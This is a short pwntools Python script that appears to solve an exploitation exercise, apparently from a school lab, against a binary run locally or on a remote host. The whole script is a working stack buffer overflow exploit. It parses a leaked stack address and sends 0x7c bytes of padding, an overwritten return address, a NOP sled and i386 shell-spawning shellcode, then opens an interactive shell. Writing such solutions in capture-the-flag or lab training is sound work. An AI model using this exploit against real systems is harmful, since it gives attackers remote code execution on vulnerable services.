#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF("01")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10001

gs = '''
b start_level
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)

io = start()
io.recvuntil('|')
leak = io.recvuntil('|')
print(leak)
leak = leak[0:8]
leak = int(leak, 16)
print("Leak: "+ hex(leak))
print("Jump: "+ hex(leak+0x7c+4+4))
io.recvuntil(': ')
shellcode = asm("NOP;"*100+shellcraft.i386.linux.sh())
payload = flat(
    b"A" * 0x7c,
    b"BBBB",
    p32(leak+0x7c+4+4),
    shellcode,
    endianness = 'little', word_size = 32, sign = False
)
io.sendline(payload)
io.recvuntil(': ')
io.sendline('+')
io.recvuntil(': ')
io.sendline('200')
salida = io.recv()
io.interactive()